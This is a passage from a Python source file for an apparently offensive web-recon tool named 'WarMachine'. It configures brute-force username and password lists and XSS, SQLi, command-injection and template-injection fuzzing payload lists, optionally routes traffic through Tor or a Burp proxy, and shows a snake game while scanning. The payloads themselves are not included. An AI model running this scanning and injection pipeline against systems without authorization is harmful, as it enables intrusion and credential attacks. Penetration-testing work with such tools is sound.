            users_list, password_list, xss_payloads, sqli_payloads, cmd_injection_payloads, template_injection_payloads, sublist, dirlist, paralist, speed, speed_option = ('/usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt', '/usr/share/wordlists/rockyou.txt', '/usr/share/wordlists/seclists/Fuzzing/XSS/robot-friendly/allXSS.txt', '/usr/share/wordlists/seclists/Fuzzing/SQLi/allSQLI.txt', '/usr/share/wordlists/seclists/Fuzzing/allCOMMANDS.txt', '/usr/share/wordlists/seclists/Fuzzing/allSSTI.txt', '/usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt', '/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt', '/usr/share/wordlists/paramlist/parameters.txt', '-t 30', '--max-rate=1000')
        elif LV == 5:
            users_list, password_list, xss_payloads, sqli_payloads, cmd_injection_payloads, template_injection_payloads, sublist, dirlist, paralist, speed, speed_option = ('/usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt', '/usr/share/wordlists/rockyou.txt', '/usr/share/wordlists/seclists/Fuzzing/XSS/robot-friendly/allXSS.txt', '/usr/share/wordlists/seclists/Fuzzing/SQLi/allSQLI.txt', '/usr/share/wordlists/seclists/Fuzzing/allCOMMANDS.txt', '/usr/share/wordlists/seclists/Fuzzing/allSSTI.txt', '/usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt', '/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt', '/usr/share/wordlists/paramlist/parameters.txt', '-t 60', '--min-rate=1000')
        else:
            raise ValueError("Invalid value for EnumLV")

        logging.info(f"Sublist: {sublist}")
        logging.info(f"Dirlist: {dirlist}")


        # Check for web proxy and Tor
        webproxy, ffuf2burp = '', 'http://127.0.0.1:8080' if await check_webproxy() else ''
        tor = 'proxychains' if await check_tor(IP) else ''
        # Corrected line to log Tor setting
        logging.info(f"Tor setting: {tor}")
        logging.info(f"Proxy setting: {ffuf2burp}")


        # Prepare directories and logs
        outputs = os.getcwd() + '/WarData'
        log_file = os.path.join(outputs, "script_log.txt")
        user = os.getlogin()
        url_list = f"{outputs}/recon/URL.log"
        inject_list = f"{outputs}/recon/inject.txt"
        logging.info(f"Current working directory: Current User {outputs} : {user}")



        # Prepare directories asynchronously
        await prepare_directories(outputs, http_IP, IP, user, log_file)

        # Create the details dictionary to hold scan information
        details = initialize_details(tor, webproxy, ffuf2burp, IP, http_IP)

        # Wordlist for secret key cracking

        # Read the password file with error handling for encoding issues
        # Reading the entire file into memory may be problematic for large files


        await send_pushover_notification(f"WarMachine is scanning {IP}", sound_key='scanning')
        time.sleep(5)

        await fingerprint_stage(IP, tor, webproxy, ffuf2burp, speed_option, outputs, details, output_queue, log_file)

        logging.info("Starting IP and port extraction script...")
        extract_and_log_ips( "WarData/fingerprint.txt", url_list)
        logging.info("Script execution completed.")

        #details = ''
        await send_pushover_notification(f'Base scans on {IP} commpleted', sound_key='scancomplete')

        await target_urls(url_list, details, dirlist, sublist, paralist, tor, ffuf2burp, speed, xss_payloads, sqli_payloads, cmd_injection_payloads, template_injection_payloads, outputs, output_queue, log_file)




    except KeyboardInterrupt:
        logging.info("(x) Process interrupted by user.")
    except Exception as e:
        message = f"(x) Unexpected error occurred: {str(e)}"
        logging.error(message)
        await send_pushover_notification(message, sound_key='dead')
    finally:
        logging.info("(+) Program finished gracefully.")
        # Create kkYou.txt and exit
        async with aiofiles.open("ThankYou.txt", "a") as file:
            await file.write("Thank you for using WarMachine by Blanco\n")


# Display output using curses
async def display_output(stdscr, output_queue, fingerprint_file):
    WIDTH = 20
    HEIGHT = 10
    SNAKE_CHAR = 'O'
    FOOD_CHAR = '1'
    EMPTY_CHAR = ' '

    UP = 'w'
    DOWN = 's'
    LEFT = 'a'
    RIGHT = 'd'

    DIRECTION_VECTORS = {
        UP: (-1, 0),
        DOWN: (1, 0),
        LEFT: (0, -1),
        RIGHT: (0, 1)
    }

    class SnakeGame:
        def __init__(self, snake_win, info_win, fingerprint_file, output_queue):
            self.snake_win = snake_win
            self.info_win = info_win
            self.fingerprint_file = fingerprint_file
            self.output_queue = output_queue
            self.initialize_game()

        def initialize_game(self):
            self.board = [[EMPTY_CHAR] * WIDTH for _ in range(HEIGHT)]
            self.snake = [(HEIGHT // 2, WIDTH // 2)]
            self.direction = random.choice([UP, DOWN, LEFT, RIGHT])
            self.food = self.place_food()
            self.board[self.snake[0][0]][self.snake[0][1]] = SNAKE_CHAR
            self.game_over = False
            self.snake_color = random.randint(1, 7)
            self.snake_win.attron(curses.color_pair(self.snake_color))

        def place_food(self):
            while True:
                food_position = (random.randint(0, HEIGHT - 1), random.randint(0, WIDTH - 1))
                if food_position not in self.snake:
                    self.board[food_position[0]][food_position[1]] = FOOD_CHAR
                    return food_position

        def change_direction(self):
            head_y, head_x = self.snake[0]
            food_y, food_x = self.food

            if head_y < food_y:
                new_direction = DOWN
            elif head_y > food_y:
                new_direction = UP
            elif head_x < food_x:
                new_direction = RIGHT
            elif head_x > food_x:
                new_direction = LEFT
            else:
                new_direction = self.direction

            dy, dx = DIRECTION_VECTORS[new_direction]
            new_head = (head_y + dy, head_x + dx)
            if new_head in self.snake:
                new_direction = self.direction

            self.direction = new_direction

        def move_snake(self):
            head_y, head_x = self.snake[0]
            dy, dx = DIRECTION_VECTORS[self.direction]
            new_head = (head_y + dy, head_x + dx)

            if (0 <= new_head[0] < HEIGHT) and (0 <= new_head[1] < WIDTH) and (new_head not in self.snake):
                self.snake.insert(0, new_head)
                if new_head == self.food:
                    self.food = self.place_food()
                else:
                    tail = self.snake.pop()
                    self.board[tail[0]][tail[1]] = EMPTY_CHAR
                self.board[new_head[0]][new_head[1]] = SNAKE_CHAR
            else:
                self.game_over = True

        def display(self):
            self.snake_win.clear()
            for row in self.board:
                self.snake_win.addstr(''.join(row) + '\n')
            self.snake_win.addstr(f'Score: {len(self.snake) - 1}\n')
            self.snake_win.refresh()

        async def play(self):
            while True:
                self.initialize_game()
                while not self.game_over:
                    self.display()
                    self.change_direction()
                    self.move_snake()
                    await self.update_info_win()
                    await asyncio.sleep(0.2)
                self.display()
                try:
                    self.snake_win.addstr('Game Over!\n')
                    self.snake_win.refresh()
                    await asyncio.sleep(2)
                except curses.error:
                    pass

        async def update_info_win(self):
            self.info_win.clear()
            self.info_win.addstr('Scanning...\n')
            try:
                async with aiofiles.open(self.fingerprint_file, 'r') as file:
                    async for line in file:
                        self.info_win.addstr(line)
            except FileNotFoundError:
                self.info_win.addstr('Fingerprint file not found.\n')
            except curses.error:
                pass  # Ignore curses errors caused by trying to write too much text
            while not self.output_queue.empty():
                message = await self.output_queue.get()
                lines = message.split('\n')
                for line in lines:
                    try:
                        self.info_win.addstr(line[:self.info_win.getmaxyx()[1] - 1] + '\n')
                    except curses.error:
                        pass
            self.info_win.refresh()

    curses.curs_set(0)
    curses.start_color()
    for i in range(1, 8):
        curses.init_pair(i, i, curses.COLOR_BLACK)
    snake_win = curses.newwin(HEIGHT + 2, WIDTH + 2, 0, 0)
    info_win = curses.newwin(HEIGHT + 2, WIDTH * 2, 0, WIDTH + 3)
    game = SnakeGame(snake_win, info_win, fingerprint_file, output_queue)
    await game.play()



def handle_exit(signum, frame):
    for task in asyncio.all_tasks():
        task.cancel()

signal.signal(signal.SIGINT, handle_exit)
signal.signal(signal.SIGTERM, handle_exit)

async def main_program():
    output_queue = asyncio.Queue()
    fingerprint_file = os.path.join(os.getcwd(), "WarData/fingerprint.txt")

    main_task = asyncio.create_task(main(output_queue))
    curses_task = asyncio.create_task(curses.wrapper(display_output, output_queue, fingerprint_file))

    # Await both tasks and ensure proper cancellation
    try:
        await asyncio.gather(main_task, curses_task)
    except asyncio.CancelledError:
        logging.info("Tasks were cancelled.")

if __name__ == "__main__":
    try:
        asyncio.run(main_program())
    except RuntimeError as e:
        logging.error(f"RuntimeError occurred: {e}")
